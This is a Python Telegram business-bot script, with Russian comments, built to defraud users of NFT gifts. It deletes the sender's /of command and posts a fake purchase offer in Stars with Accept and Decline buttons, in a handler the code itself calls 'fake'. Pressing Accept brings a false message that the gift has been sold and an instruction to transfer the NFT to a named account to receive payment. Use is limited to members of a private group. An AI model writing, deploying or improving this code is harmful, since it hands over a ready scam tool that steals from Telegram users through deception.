import asyncio
import os
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
from aiogram.exceptions import TelegramBadRequest

BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# --- НАСТРОЙКИ ПОДПИСКИ ---
# ВСТАВЬТЕ СЮДА ID ВАШЕЙ ГРУППЫ (начинается с -100...)
TARGET_CHAT_ID = -1003747516067
# Ссылка на вашу группу
INVITE_LINK = "https://t.me/+Q7j5G8Y24_U5OWY6"

def get_pretty_name(slug):
    raw_name = slug.split('-')[0]
    return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)

# Функция проверки подписки на группу
async def is_subscribed(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=TARGET_CHAT_ID, user_id=user_id)
        # Если статус не "вышел" и не "кикнут", значит состоит в группе
        return member.status in ["member", "administrator", "creator"]
    except Exception as e:
        print(f"Ошибка проверки подписки (убедитесь, что бот админ в группе): {e}")
        return False

@dp.business_message(F.text.startswith("/of"))
async def handle_offer_command(message: types.Message):
    business_connection_id = message.business_connection_id
    if not business_connection_id:
        return

    # --- ПРОВЕРКА ПОДПИСКИ ---
    if not await is_subscribed(message.from_user.id):
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)]
        ])
        await bot.send_message(
            chat_id=message.chat.id,
            text="⚠️ <b>Для использования бота вы должны состоять в нашей группе.</b>\n\nВступите в группу и попробуйте снова.",
            reply_markup=keyboard,
            business_connection_id=business_connection_id,
            parse_mode="HTML"
        )
        return # Прерываем выполнение, оффер не отправляется

    # --- ОСНОВНАЯ ЛОГИКА ОФФЕРА ---
    parts = message.text.split()
    if len(parts) < 3:
        return

    link = parts[1]
    try:
        amount = int(parts[2])
    except ValueError:
        return

    match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
    if not match:
        return
    
    gift_slug = match.group(1)
    pretty_name = get_pretty_name(gift_slug)
    username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name

    try:
        # Удаляем команду /of
        await bot.delete_business_messages(
            business_connection_id=business_connection_id,
            message_ids=[message.message_id]
        )

        caption_text = (
            f"Пользователь ({username})\n"
            f"предлагает вам\n"
            f"<b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a>."
        )

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{gift_slug}:{amount}"),
                InlineKeyboardButton(text="Принять", callback_data=f"accept:{gift_slug}:{amount}")
            ]
        ])

        await bot.send_message(
            chat_id=message.chat.id,
            text=caption_text,
            reply_markup=keyboard,
            business_connection_id=business_connection_id,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(
                url=link,
                show_above_text=True,
                prefer_large_media=True
            )
        )

    except Exception as e:
        print(f"Ошибка отправки: {e}")

@dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
async def handle_fake_buttons(callback: types.CallbackQuery):
    if not callback.message:
        await callback.answer("Сообщение не найдено.", show_alert=True)
        return

    # Дополнительная проверка при нажатии кнопки (на случай, если вышел из группы)
    if not await is_subscribed(callback.from_user.id):
        await callback.answer("Вы вышли из группы! Вступите обратно, чтобы продолжить.", show_alert=True)
        return

    data_parts = callback.data.split(":")
    action = data_parts[0]
    gift_slug = data_parts[1]
    amount = data_parts[2]

    link = f"https://t.me/nft/{gift_slug}"
    pretty_name = get_pretty_name(gift_slug)
    business_connection_id = callback.message.business_connection_id

    try:
        await bot.delete_business_messages(
            business_connection_id=business_connection_id,
            message_ids=[callback.message.message_id]
        )

        if action == "accept":
            new_text = (
                f"🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n"
                f"• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд."
            )
            
            new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Передать NFT", url="https://t.me/Gifts_Replayer")]
            ])
        else:
            new_text = f"❌ Оффер на <b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен."
            new_keyboard = None

        await bot.send_message(
            chat_id=callback.message.chat.id,
            text=new_text,
            reply_markup=new_keyboard,
            business_connection_id=business_connection_id,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(
                url=link,
                show_above_text=True,
                prefer_large_media=True
            )
        )
        
        await callback.answer()

    except TelegramBadRequest:
        await callback.answer()
    except Exception as e:
        print(f"Ошибка обработки кнопки: {e}")
        await callback.answer("Произошла ошибка.", show_alert=True)

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
